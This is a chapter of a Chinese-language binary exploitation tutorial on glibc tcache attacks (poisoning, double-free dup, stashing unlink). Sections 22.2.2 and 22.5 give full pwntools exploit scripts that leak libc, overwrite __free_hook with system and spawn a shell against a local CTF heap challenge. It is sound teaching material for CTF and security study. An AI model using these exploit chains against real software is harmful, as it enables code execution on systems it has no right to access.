# 第 22 章 Tcache Attack

> tcache 是 glibc 2.26 引入的线程缓存，它比 fastbin 更快、检查更宽松。没有 size 检查意味着 tcache poisoning 可以直接指向任意地址——这是现代堆利用最常用的手法。

---

## 22.1 tcache 的结构

每个线程有一个 `tcache_perthread_struct`：

```c
typedef struct tcache_perthread_struct {
    char counts[TCACHE_MAX_BINS];          // 每个链表当前的 chunk 数量（最多 7）
    tcache_entry *entries[TCACHE_MAX_BINS]; // 64 个链表头
} tcache_perthread_struct;
```

每个 tcache chunk 的结构：

```c
typedef struct tcache_entry {
    struct tcache_entry *next;   // 单向链表的下一个（在 user data 位置）
    uintptr_t key;               // 所属 tcache 的指针（在 user data + 8）
} tcache_entry;
```

**关键特性**：

1. **64 个链表**，大小从 0x20 到 0x410（间隔 0x10）
2. **每个链表最多 7 个** chunk
3. **单向链表，LIFO**
4. **2.29+ 有 key 检查**（防 double free）
5. **malloc 从 tcache 取 chunk 时不检查 size** ← 这是 tcache poisoning 如此强大的原因

---

## 22.2 tcache poisoning：任意地址分配

### 22.2.1 原理

因为 malloc 从 tcache 取 chunk 时**不检查 size**，只要能修改已释放 tcache chunk 的 `next`（fd）指针指向目标地址，下一次 malloc 就会返回该地址。

```text
1. malloc A（0x40）
2. free A → tcache[4]: A（A.next = NULL, A.key = tcache）
3. UAF 写：A.next = target_addr
4. malloc → 返回 A，tcache 链表头 = target_addr
5. malloc → 返回 target_addr！
```

对比 fastbin attack：不需要找「伪造的 size」，可以直接指向任何 8 字节对齐的地址。

### 22.2.2 实战：改写 __free_hook

glibc 2.31 下（hook 还未移除）：

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')

p = process(elf.path)

# 假设已泄露 libc_base
free_hook = libc_base + libc.sym['__free_hook']
system_addr = libc_base + libc.sym['system']

# 1. 分配并释放一个 0x40 的 chunk
add(0, 0x30, b'A' * 0x30)   # chunk size 0x40
delete(0)                    # 进入 tcache[3]

# 2. UAF 修改 next 指针指向 free_hook
edit(0, p64(free_hook))

# 3. 两次 malloc
add(1, 0x30, b'B' * 0x30)   # 返回原 chunk
add(2, 0x30, p64(system_addr))  # 返回 free_hook，写入 system 地址！

# 4. 触发 free("/bin/sh")
# 需要一块内容为 "/bin/sh" 的内存，然后 free 它
add(3, 0x30, b'/bin/sh\x00')
delete(3)   # free("/bin/sh") → system("/bin/sh") → getshell

p.interactive()
```

---

## 22.3 tcache dup

glibc 2.29 之前：tcache 完全没有 double free 检查，可以 `free(p); free(p)`，tcache 链表里出现两个相同的指针。

glibc 2.29+：key 检查阻止直接 double free，但可以：

1. free 后通过 UAF 把 key 清 0
2. 再次 free

```python
# glibc 2.31 的 tcache dup
add(0, b'A' * 0x40)
delete(0)
edit(0, b'\x00' * 16)    # 清 fd 和 key（fd 也无所谓）
delete(0)                 # 再次 free，成功进入 tcache 两次

# 现在 tcache 链表：A → A
add(1, b'B' * 0x40)  # 返回 A
add(2, b'C' * 0x40)  # 又返回 A
```

---

## 22.4 tcache stashing unlink attack

这是一个更高级的技巧，涉及 smallbin 和 tcache 的交互。

**背景**：当 malloc 从 smallbin 取 chunk 时，如果 smallbin 里还有剩余 chunk，glibc 会把它们「stash」（暂存）到 tcache 里。

**漏洞**：这个 stash 过程会修改 chunk 的 `bk` 指针，如果 smallbin 的 bk 链被伪造，就能实现任意地址写。

```text
条件：
- 目标地址处有伪造的 chunk（size 字段合法）
- 能控制 smallbin 中某个 chunk 的 bk 指针指向伪造 chunk

效果：
- 伪造 chunk 的地址被写入 tcache 链表
- 下次 malloc 返回该地址 → 任意地址写
```

这个技巧在 House of Apple 等高级利用中会用到，入门阶段了解即可。

---

## 22.5 实战：完整的 tcache poisoning（glibc 2.31）

### 程序

一个典型的菜单式堆题：add / delete / edit / show，delete 后指针不清零（UAF）。

### 利用链

```text
1. 泄露 libc：
   - 分配一个大块（> 0x410，不进 tcache）
   - free → 进入 unsorted bin，fd/bk = main_arena
   - show → 泄露 libc 基址

2. tcache poisoning：
   - 分配一个 0x40 的 chunk，free 进 tcache
   - edit 修改 fd → __free_hook
   - malloc 两次，第二次返回 __free_hook
   - 写入 system 地址

3. getshell：
   - 分配一块写 "/bin/sh"
   - free 它 → system("/bin/sh")
```

### 完整 exp

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./heap_chall')
libc = ELF('./libc.so.6')

p = process(elf.path)

def add(idx, size, data):
    p.sendlineafter(b'Choice: ', b'1')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def delete(idx):
    p.sendlineafter(b'Choice: ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

def show(idx):
    p.sendlineafter(b'Choice: ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())

# ====== 第一步：泄露 libc ======
add(0, 0x500, b'A' * 0x500)   # 大块，绕过 tcache
delete(0)                      # 进入 unsorted bin
show(0)                        # UAF 读
leak = u64(p.recvline().strip()[:6].ljust(8, b'\x00'))
libc_base = leak - 0x1ebbe0   # main_arena+96 的偏移（根据 libc 调整）
log.success(f'libc base: {hex(libc_base)}')

# ====== 第二步：tcache poisoning ======
free_hook = libc_base + libc.sym['__free_hook']
system_addr = libc_base + libc.sym['system']

add(1, 0x30, b'B' * 0x30)     # chunk size 0x40
delete(1)                      # 进入 tcache
edit(1, p64(free_hook))        # 修改 fd

add(2, 0x30, b'C' * 0x30)     # 返回原 chunk
add(3, 0x30, p64(system_addr))  # 返回 free_hook，写入 system

# ====== 第三步：getshell ======
add(4, 0x30, b'/bin/sh\x00')
delete(4)                      # free("/bin/sh") → system("/bin/sh")
p.interactive()
```

---

## 22.6 glibc 2.35 的变化

glibc 2.34+ 移除了 `__malloc_hook`、`__free_hook`、`__realloc_hook` 等钩子函数。上面的利用链在 2.35 下失效。

替代方案：

- **IO_FILE 利用**：改写 `_IO_2_1_stdout_` 或 `_IO_list_all`（第 26 章）
- **exit hook**：利用 `__exit_funcs` 链
- **GOT 覆写**：如果程序是 Partial RELRO

tcache poisoning 的技术本身仍然有效，只是目标地址变了。

---

## 22.7 小结

这一章我们学了 Tcache Attack：

- **tcache 结构**：64 条单向链表，LIFO，最多 7 个，2.29+ 有 key 检查
- **tcache poisoning**：修改 fd 让 malloc 返回任意地址（无 size 检查，比 fastbin attack 更强大）
- **tcache dup**：清 key 后重复 free
- **常见目标**：`__free_hook`（2.34 前）、IO_FILE 结构（2.34 后）
- 完整的利用链：泄露 libc → tcache poisoning → 改写 hook → getshell

下一章我们学习 Unsorted Bin Attack 和 Largebin Attack——利用双向链表解链时的漏洞。

---

**下一章**：[Unsorted Bin Attack](./ch23-Unsorted-Bin-Attack.md)
